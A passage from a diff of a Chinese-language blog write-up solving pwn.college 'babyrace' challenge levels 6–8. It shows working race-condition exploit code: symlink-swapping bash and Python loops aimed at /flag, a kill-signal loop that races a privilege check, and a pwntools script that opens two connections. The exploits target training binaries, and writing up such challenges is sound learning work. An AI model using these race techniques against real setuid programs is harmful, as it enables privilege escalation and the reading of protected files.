cd<br>    mv a b<br>    ln -s / /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/home/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/home/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure>
 
-<h5 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h5><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure>
+<h5 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h5><p>unlink symlink只要0.000035s就可以完成系统调用.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure>
 
 <p>initpy:</p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/a/home<br>touch ./1/a/home/b<br><br>mkdir -p ./2<br>ln -s / ./2/a<br><br>mkdir -p ./3/a/home<br>ln -s /flag ./3/a/home/b<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure>
@@ -1841,7 +1843,35 @@
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..20000&#125;;do /challenge/babyrace_level6.1 ./dir/a/home/b;done) \<br>| egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure>
 
 <p>成功率降到了20/20000, 变成千分之一了……..</p>
-<h4 id="level7-4"><a href="#level7-4" class="headerlink" title="level7"></a>level7</h4><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>这里要指向2处的地址, 也就是bss+0x10
+<h4 id="level7-4"><a href="#level7-4" class="headerlink" title="level7"></a>level7</h4><p>保护全开. 做不出来, 去看了看<code>.0</code>程序的race point在哪里.</p>
+<p>没看懂. 噢, 我在discord上面看到了提示!!! 才想起来视频里有提到signal, 而且这次也有signal handler.</p>
+<p>一开始还在想这岂不是要等十分钟, 然后突然想起来有系统调用可以给其他进程发送信号.</p>
+<p>而且程序中的timeout_handler也只是执行logout而已. 这样race point就很明显了, 只要一次成功就可以了.</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;win_authed&quot;</span>) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( privilege_level )<br>      &#123;<br><span class="hljs-comment">//就是这里--------------------------------------------------------</span><br>        <span class="hljs-keyword">if</span> ( privilege_level == <span class="hljs-number">1</span> )<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your privilege level is too low!&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>          win();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are not logged in!&quot;</span>);<br>      &#125;&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>有一个kill系统调用, <del>要知道pid参数的话那还是直接用pwntools启动, 不知道python的sendline耗时如何….</del>算了不用了</p>
+<ul>
+<li>总之命令行里启动challenge, 永真循环里echo <code>login</code>和<code>win_authed</code>两条命令, 即<code>login\nwin_authed\n</code>.</li>
+<li>然后命令行永真循环, 不停kill pid 14.</li>
+</ul>
+<p>非常直接, 成功率也是非常的低:</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">while true;do kill -s 14 465;done<br>(while true;do printf &#x27;login\nwin_authed\n&#x27;;done)|/challenge/babyrace_level7.1|grep &#x27;pwn&#x27;<br>ps aux<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level8-4"><a href="#level8-4" class="headerlink" title="level8"></a>level8</h4><ul>
+<li>调试可以使用practice mode中的sudo gdb, 或者使用pwntools以非set_uid启动程序.<ul>
+<li><code>info thread</code> + <code>thread [num]</code> </li>
+<li>第一个hit breadpoint的线程会停下来, gdb还会切换到那个线程上.</li>
+<li></li>
+</ul>
+</li>
+<li><code>ps auxH</code> 显示线程.</li>
+<li></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://akkadia.org/drepper/tls.pdf">ELF Handling For TLS</a> | <a target="_blank" rel="noopener" href="https://maskray.me/blog/2021-02-14-all-about-thread-local-storage">哪位神的TLS variable文章</a> |<br>上面是有关程序中使用的fs来定位线程私有变量的原理.</p>
+<p>每个线程有自己的空间, 但是privilege_level是全局的. 使用pwntools开两个连接, 和上一题一样的做法.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn <br> <br>pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br> <br><span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babyrace_level8.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>        remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <span class="hljs-number">3</span><br>        remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>        pwn.info(remote.clean().decode()) <br></code></pre></div></td></tr></table></figure>
+
+<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>这里要指向2处的地址, 也就是bss+0x10
 <a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.
 <a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>这之后要接收puts的地址.
 <a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
